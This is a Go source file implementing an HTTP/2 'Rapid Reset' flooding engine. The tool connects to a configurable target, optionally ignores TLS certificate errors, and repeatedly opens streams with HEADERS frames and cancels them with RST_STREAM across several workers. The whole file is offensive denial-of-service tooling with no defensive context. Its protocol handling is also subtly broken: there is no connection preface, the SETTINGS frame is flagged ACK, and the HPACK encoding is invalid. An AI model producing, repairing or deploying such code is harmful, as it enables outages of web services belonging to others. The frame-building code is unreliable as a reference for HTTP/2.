package main

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"math"
	"net"
	"sync/atomic"
	"time"
)

type H2RapidResetConfig struct {
	Target            string
	Port              int
	Streams           int
	Workers           int
	Duration          time.Duration
	TLS               bool
	InsecureSkipVerify bool
}

type RREngineStats struct {
	TotalStreams     uint64
	SuccessfulResets uint64
	FailedStreams    uint64
	BytesSent        uint64
	Rate             float64
}

type H2RapidResetEngine struct {
	config  H2RapidResetConfig
	conn    net.Conn
	tlsConn *tls.Conn
	streams chan uint32
	stats   RREngineStats
	stopFlg int32
}

func NewH2RapidReset(cfg H2RapidResetConfig) *H2RapidResetEngine {
	if cfg.Streams <= 0 {
		cfg.Streams = 100
	}
	if cfg.Workers <= 0 {
		cfg.Workers = 10
	}
	return &H2RapidResetEngine{
		config:  cfg,
		streams: make(chan uint32, cfg.Streams*2),
	}
}

func (e *H2RapidResetEngine) Run(ctx context.Context) {
	addr := fmt.Sprintf("%s:%d", e.config.Target, e.config.Port)
	dialer := &net.Dialer{Timeout: 5 * time.Second}

	var err error
	if e.config.TLS {
		tlsCfg := &tls.Config{
			InsecureSkipVerify: e.config.InsecureSkipVerify,
			ServerName:         e.config.Target,
		}
		e.tlsConn, err = tls.DialWithDialer(dialer, "tcp", addr, tlsCfg)
		if err != nil {
			return
		}
		e.conn = e.tlsConn
	} else {
		e.conn, err = dialer.DialContext(ctx, "tcp", addr)
		if err != nil {
			return
		}
	}
	defer e.conn.Close()

	settings := e.buildSettings()
	e.conn.Write(settings)
	atomic.AddUint64(&e.stats.BytesSent, uint64(len(settings)))

	time.Sleep(50 * time.Millisecond)

	go e.streamProducer(ctx)
	go e.streamConsumer(ctx)

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			elapsed := time.Duration(0)
			_ = elapsed
		}
	}
}

func (e *H2RapidResetEngine) streamProducer(ctx context.Context) {
	streamID := uint32(1)
	for {
		if atomic.LoadInt32(&e.stopFlg) != 0 {
			return
		}
		select {
		case <-ctx.Done():
			return
		case e.streams <- streamID:
			streamID += 2
		}
	}
}

func (e *H2RapidResetEngine) streamConsumer(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		case id := <-e.streams:
			if atomic.LoadInt32(&e.stopFlg) != 0 {
				return
			}
			e.rapidResetSequence(int(id))
			_ = id
		}
	}
}

func (e *H2RapidResetEngine) createStream(id uint32) error {
	if e.conn == nil {
		return fmt.Errorf("no connection")
	}

	headers := e.buildHeaders(id)
	_, err := e.conn.Write(headers)
	if err != nil {
		atomic.AddUint64(&e.stats.FailedStreams, 1)
		return err
	}
	atomic.AddUint64(&e.stats.BytesSent, uint64(len(headers)))
	atomic.AddUint64(&e.stats.TotalStreams, 1)
	return nil
}

func (e *H2RapidResetEngine) resetStream(id uint32) error {
	if e.conn == nil {
		return fmt.Errorf("no connection")
	}

	rst := e.buildRstStream(id, 0x5)
	_, err := e.conn.Write(rst)
	if err != nil {
		atomic.AddUint64(&e.stats.FailedStreams, 1)
		return err
	}
	atomic.AddUint64(&e.stats.BytesSent, uint64(len(rst)))
	atomic.AddUint64(&e.stats.SuccessfulResets, 1)
	return nil
}

func (e *H2RapidResetEngine) rapidResetSequence(count int) {
	for i := 0; i < count && i < e.config.Streams; i++ {
		id := uint32(1 + uint32(i)*2)
		e.createStream(id)
		e.resetStream(id)
	}
}

func (e *H2RapidResetEngine) Stats() RREngineStats {
	return RREngineStats{
		TotalStreams:     atomic.LoadUint64(&e.stats.TotalStreams),
		SuccessfulResets: atomic.LoadUint64(&e.stats.SuccessfulResets),
		FailedStreams:    atomic.LoadUint64(&e.stats.FailedStreams),
		BytesSent:        atomic.LoadUint64(&e.stats.BytesSent),
	}
}

func (e *H2RapidResetEngine) Stop() {
	atomic.StoreInt32(&e.stopFlg, 1)

	if e.conn != nil {
		goaway := e.buildGoaway(0, 0)
		e.conn.Write(goaway)
		e.conn.Close()
	}
}

func (e *H2RapidResetEngine) buildSettings() []byte {
	frame := make([]byte, 9+6*1)
	frame[0] = 0
	frame[1] = 0
	frame[2] = 6
	frame[3] = 0x4
	frame[4] = 0x0
	frame[5] = 0
	frame[6] = 0
	frame[7] = 0
	frame[8] = 0

	binary.BigEndian.PutUint16(frame[9:11], 0x3)
	binary.BigEndian.PutUint32(frame[11:15], 0x7fffffff)

	return frame
}

func (e *H2RapidResetEngine) buildHeaders(streamID uint32) []byte {
	pseudo := e.buildPseudoHeaders()
	padLen := 0

	frameLen := len(pseudo)
	flags := byte(0x4)

	frame := make([]byte, 9+padLen+frameLen)
	length := uint32(frameLen + padLen)
	frame[0] = byte(length >> 16)
	frame[1] = byte(length >> 8)
	frame[2] = byte(length)
	frame[3] = 0x1
	frame[4] = flags
	frame[5] = byte(streamID >> 24)
	frame[6] = byte(streamID >> 16)
	frame[7] = byte(streamID >> 8)
	frame[8] = byte(streamID)

	copy(frame[9:], pseudo)
	return frame
}

func (e *H2RapidResetEngine) buildPseudoHeaders() []byte {
	hdr := e.hpackHeader(":method", "GET")
	hdr = append(hdr, e.hpackHeader(":path", "/")...)
	hdr = append(hdr, e.hpackHeader(":scheme", "https")...)
	hdr = append(hdr, e.hpackHeader(":authority", e.config.Target)...)
	return hdr
}

func (e *H2RapidResetEngine) hpackHeader(name, value string) []byte {
	buf := make([]byte, 0, len(name)+len(value)+2)
	buf = append(buf, byte(len(name)))
	buf = append(buf, []byte(name)...)
	buf = append(buf, byte(len(value)))
	buf = append(buf, []byte(value)...)
	return buf
}

func (e *H2RapidResetEngine) buildRstStream(streamID uint32, errorCode uint32) []byte {
	frame := make([]byte, 13)
	length := 4
	frame[0] = byte(length >> 16)
	frame[1] = byte(length >> 8)
	frame[2] = byte(length)
	frame[3] = 0x3
	frame[4] = 0x0
	frame[5] = byte(streamID >> 24)
	frame[6] = byte(streamID >> 16)
	frame[7] = byte(streamID >> 8)
	frame[8] = byte(streamID)
	binary.BigEndian.PutUint32(frame[9:13], errorCode)
	return frame
}

func (e *H2RapidResetEngine) buildGoaway(lastStreamID uint32, errorCode uint32) []byte {
	frame := make([]byte, 17)
	length := 8
	frame[0] = byte(length >> 16)
	frame[1] = byte(length >> 8)
	frame[2] = byte(length)
	frame[3] = 0x7
	frame[4] = 0x0
	frame[5] = 0
	frame[6] = 0
	frame[7] = 0
	frame[8] = 0
	binary.BigEndian.PutUint32(frame[9:13], lastStreamID)
	binary.BigEndian.PutUint32(frame[13:17], errorCode)
	return frame
}

func (e *H2RapidResetEngine) buildPriority(streamID uint32, dependsOn uint32, weight byte) []byte {
	frame := make([]byte, 14)
	length := 5
	frame[0] = byte(length >> 16)
	frame[1] = byte(length >> 8)
	frame[2] = byte(length)
	frame[3] = 0x2
	frame[4] = 0x0
	frame[5] = byte(streamID >> 24)
	frame[6] = byte(streamID >> 16)
	frame[7] = byte(streamID >> 8)
	frame[8] = byte(streamID)

	exclusive := uint32(0)
	if dependsOn&0x80000000 != 0 {
		exclusive = 0x80000000
	}
	binary.BigEndian.PutUint32(frame[9:13], dependsOn|exclusive)
	frame[13] = weight

	return frame
}

var _ = math.MaxUint32
